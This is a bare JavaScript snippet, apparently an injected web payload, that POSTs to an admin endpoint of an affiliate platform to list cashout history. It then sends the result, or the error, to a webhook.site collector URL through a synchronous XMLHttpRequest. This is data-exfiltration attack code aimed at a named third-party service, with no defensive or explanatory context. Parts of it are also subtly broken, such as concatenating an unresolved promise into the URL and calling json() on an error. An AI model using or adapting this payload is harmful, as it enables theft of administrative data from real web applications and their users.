const dataToSend = {
};

fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  headers: {
    'Content-Type': 'application/json' // Indicate the type of data being sent
  },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  a = response.json(); // Parse the JSON response from the server

  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+a, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+a, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
});
